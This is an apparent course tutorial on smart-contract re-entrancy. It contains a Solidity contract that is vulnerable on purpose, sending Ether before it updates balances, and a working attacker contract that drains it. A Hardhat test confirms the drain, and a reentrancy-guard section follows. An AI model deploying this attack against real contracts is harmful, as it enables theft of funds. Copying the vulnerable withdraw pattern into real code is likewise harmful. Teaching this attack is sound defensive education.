# Re-Entrancy

Who wants to do some hacking!!!

---

## What is Re-Entrancy?

- Contract A calls a function in contract B
- Then contract B calls back into contract A while contract A is still processing

This can lead to some serious vulnerabilities in Smart contracts.

## Real World Examples?

[The DAO Attack](https://coinmarketcap.com/alexandria/article/a-history-of-the-dao-hack)

## Requirements

- There will be two contracts: GoodContract and BadContract
- BadContract should be able drain all the Eth out of the GoodContract

## Build

Lets build an example where you can experience how the Re-Entrancy attack happens.

- To setup a Hardhat project, Open up a terminal and execute these commands

  ```bash
  npm init --yes
  npm install --save-dev hardhat
  ```

- In the same directory where you installed Hardhat run:

  ```bash
  npx hardhat
  ```

  - Select `Create a basic sample project`
  - Press enter for the already specified `Hardhat Project root`
  - Press enter for the question on if you want to add a `.gitignore`
  - Press enter for `Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

Now you have a hardhat project ready to go!

If you are not on mac, please do this extra step and install these libraries as well :)

```bash
npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
```

and press `enter` for all the questions.

- Start by creating a new file inside the contracts directory called GoodContract.sol

```go
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract GoodContract {

    mapping(address => uint) public balances;

    /**
        addBalance is used to add ether to the user's balance
     */
    function addBalance() public payable {
        balances[msg.sender] += msg.value;
    }

    /**
        withdraw is used to remove the user's balance of ether
     */
    function withdraw() public {
        require(balances[msg.sender] > 0);
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "Failed to send ether");
        // This code becomes unreachable because the contract's balance is drained
        // before user's balance could have been set to 0
        balances[msg.sender] = 0;
    }
}
```

- GoodContract has two functions

  - addBalance() which adds ether balance for an address
  - withdraw() where users can withdraw all of their balance at once

- Now lets create another file inside the contracts directory known as `BadContract.sol`

```go
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.10;

    import "./GoodContract.sol";

    contract BadContract {
        GoodContract public goodContract;
        constructor(address _goodContractAddress) {
            goodContract = GoodContract(_goodContractAddress);
        }
        // Function to receive Ether. msg.data must be empty
        receive() external payable {
            if(address(goodContract).balance > 0) {
                goodContract.withdraw();
            }
        }
        /**
            attack would start an attack to withdraw all the funds from the
            goodContract
        */
        function attack() public payable {
            goodContract.addBalance{value: msg.value}();
            goodContract.withdraw();
        }
    }
```

- BadContract has two functions

  - contructor which takes in the GoodContract's address and intilializes its own instance of GoodContract
  - recieve() which gets called when contract recieves ethers and msg.data is empty
  - attack() is the function which the user will use to drain all the Eth out of the GoodContract, how it will do so is as follows:
    - Attack will call addBalance, making sure that BadContract's address has some balance in the GoodContract
    - Now it will try calling the `GoodContract` withdraw function which will first check that the BadContract has some balance and then it will send `Eth` equal to BadContract's address balance to the BadContract.
    - This will trigger the recieve function in the BadContract which will again call the withdraw function.
    - Now in the withdraw function because `balances[msg.sender] = 0;` has not been executed yet, the contract still believes that the BadContract's address has balance.
    - So it again sends the Eth equal to the amount of BadContract's balance to BadContract
    - This keeps happening till all the Eth in GoodContract is drained

- Replace all the code in your `hardhat.config.js` with the following code:

  ```javascript
  require("@nomiclabs/hardhat-waffle");

  // This is a sample Hardhat task. To learn how to create your own go to
  // https://hardhat.org/guides/create-task.html
  task("accounts", "Prints the list of accounts", async (taskArgs, hre) => {
    const accounts = await hre.ethers.getSigners();

    for (const account of accounts) {
      console.log(account.address);
    }
  });

  // You need to export an object to set up your config
  // Go to https://hardhat.org/config/ to learn more

  /**
   * @type import('hardhat/config').HardhatUserConfig
   */
  module.exports = {
    solidity: "0.8.10",
  };
  ```

- Now we would write a test to make sure that our BadContract is actually draining all the funds from the GoodContract

- Read [Hardhat Docs for testing](https://hardhat.org/tutorial/testing-contracts.html) before procedding

- Now create a file under the `test` folder named `attack.js`

- Add the following content to `attack.js`

  ```js
  const { expect } = require("chai");
  const { BigNumber } = require("ethers");
  const { ethers, waffle } = require("hardhat");

  describe("Attack", function () {
    it("Should empty the balance of the good contract", async function () {
      // Deploy the good contract
      const goodContract = await ethers.getContractFactory("GoodContract");
      const _goodContract = await goodContract.deploy();
      await _goodContract.deployed();
      console.log("Good Contract's Address", _goodContract.address);
      //Deploy the bad contract
      const badContract = await ethers.getContractFactory("BadContract");
      const _badContract = await badContract.deploy(_goodContract.address);
      await _badContract.deployed();
      console.log("Bad Contract's Address", _badContract.address);
      // Get two addresses
      const [_, addr1, addr2] = await ethers.getSigners();

      // User1 deposits 10 ether into the contract
      let tx = await _goodContract.connect(addr1).addBalance({
        value: ethers.utils.parseEther("10.0"),
      });

      await tx.wait();

      const provider = waffle.provider;

      // Check that at this point the GoodContract's balance is not zero
      let balanceETH = await provider.getBalance(_goodContract.address);
      expect(balanceETH).to.not.equal(BigNumber.from("0"));

      // User calls attack function
      tx = await _badContract.connect(addr2).attack({
        value: ethers.utils.parseEther("1.0"),
      });
      await tx.wait();

      balanceETH = await provider.getBalance(_goodContract.address);
      // Balance of the GoodContract's address is zero know
      expect(balanceETH).to.equal(BigNumber.from("0"));
    });
  });
  ```

- Now to finally execute the test, on your terminal type:

  ```
  npx hardhat test
  ```

- If all your tests are passing you have completed the module. Use the GoodContract's Address that was printed on your terminal to verify this level on the website

## Prevention

- Ensure all state changes happen before calling external contracts
- Use function modifiers that prevent re-entrancy

```go
    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
```
